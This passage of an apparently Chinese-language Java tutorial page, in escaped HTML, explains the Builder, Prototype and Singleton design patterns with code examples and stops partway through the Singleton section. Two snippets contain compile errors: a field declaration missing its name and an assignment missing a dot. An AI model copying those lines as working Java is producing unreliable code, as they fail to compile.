&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FastFactory&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;good&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">GoodFactory&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid factory name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="生成器builder">生成器Builder&lt;/h3>
&lt;p>生成器Builder是使用多个小型工厂来最终创建一个完整对象，当我们使用Builder时一般是因为创建这个对象的步骤比较多，每个步骤都需要一个零部件，最终组合成一个完整的对象&lt;/p>
&lt;p>举例：md文本转html，直接写一个完整的转换器比较困难，但如果针对单一类型的文本就很好做了&lt;/p>
&lt;ul>
&lt;li>&lt;code>#&lt;/code>开头：&lt;code>HeadingBuilder&lt;/code>转换&lt;/li>
&lt;li>&lt;code>&amp;gt;&lt;/code>开头：&lt;code>QuoteBuilder&lt;/code>转换&lt;/li>
&lt;li>&lt;code>---&lt;/code>开头：&lt;code>HrBuilder&lt;/code>转换&lt;/li>
&lt;li>其余使用&lt;code>ParagraphBuilder&lt;/code>转换&lt;/li>
&lt;/ul>
&lt;p>我们先写一个总的&lt;code>HtmlBuilder&lt;/code>把转换的任务拆分&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HtmlBuilder&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">HeadingBuilder&lt;/span> &lt;span style="color:#111">headingBuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HeadingBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">HrBuilder&lt;/span> &lt;span style="color:#111">hrBuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HrBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">QuoteBuilder&lt;/span> &lt;span style="color:#111">quoteBuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">QuoteBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">ParagraphBuilder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ParagraphBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">toHtml&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">markdown&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">StringBuilder&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">StringBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">markdown&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lines&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">forEach&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">startsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;#&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">headingBuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">buildHeading&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">startsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">quoteBuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">buildQuote&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">startsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;---&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hrBuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">buildHr&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">paragraphBuilder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">buildParagraph&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">append&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后分别编写对于功能的Builder即可，比如&lt;code>HeadingBuilder&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HeadingBuilder&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">buildHeading&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">charAt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;#&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">++;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;h%d&amp;gt;%s&amp;lt;/h%d&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">line&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">strip&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="原型prototype">原型Prototype&lt;/h3>
&lt;p>原型Prototype，是指创建新对象的时候，根据现有的一个原型来创建（javascript中全是原型）&lt;/p>
&lt;p>举例：已有一个&lt;code>String[]&lt;/code>数组，想创建一个一模一样的&lt;code>String[]&lt;/code>数组，我们会将现有数组的元素复制到新数组，这个过程封装起来就变成了原型模式&lt;/p>
&lt;p>对于普通类想要实现原型拷贝，可以实现&lt;code>Cloneable&lt;/code>接口来标识一个对象是可复制的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Cloneable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">score&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">clone&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Student&lt;/span> &lt;span style="color:#111">std&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">std&lt;/span> &lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">score&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">score&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用的时因为&lt;code>clone()&lt;/code>的方法签名是定义在&lt;code>Object&lt;/code>中，返回类型也是&lt;code>Object&lt;/code>，所以要强制转型，比较麻烦：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Student&lt;/span> &lt;span style="color:#111">std1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">std1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setId&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">std1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">std1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setScore&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">88&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 复制新对象:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Student&lt;/span> &lt;span style="color:#111">std2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">std1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">clone&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">std1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">std2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">std1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">std2&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用原型模式更好的方式是定义一个&lt;code>copy()&lt;/code>方法，返回明确的类型：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">score&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Student&lt;/span> &lt;span style="color:#75af00">copy&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Student&lt;/span> &lt;span style="color:#111">std&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">score&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">score&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>原型模式应用不是很广泛，因为很多实例会持有类似文件、Socket这样的资源，而这些资源是无法复制给另一个对象共享的，只有存储简单类型的“值”对象可以复制&lt;/p>
&lt;h3 id="单例singleton">单例Singleton&lt;/h3>
&lt;p>单例Singleton是为了保证在一个进程中，某一个类有且仅有一个实例&lt;/p>
&lt;p>*应用场景：很多程序（尤其是web程序），大部分服务类都应该被视作Singleton，如果全部按照Singleton的写法写，会非常麻烦，所以通常是通过约定让框架（如Spring）来实例化这些类，保证只有一个实例，调用方自觉通过框架获取实例而不是&lt;code>new&lt;/code>操作符；因此除非确有必要，否则Singleton模式一般以约定为主，不会刻意实现它&lt;/p>
&lt;p>因为这个类只有一个实例，因此不能让调用方通过&lt;code>new&lt;/code>来创建实例了，这样无法做到控制仅有1个实例，所以单例的构造方法必须是&lt;code>private&lt;/code>，这样防止了调用方自己创建实例，但是在类的内部是可以用一个静态字段来引用唯一创建的实例的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Singleton&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 静态字段引用唯一实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Singleton&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Singleton&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// private构造方法保证外部无法实例化
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#75af00">Singleton&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>外部调用方通过静态方法返回实例&lt;/p>
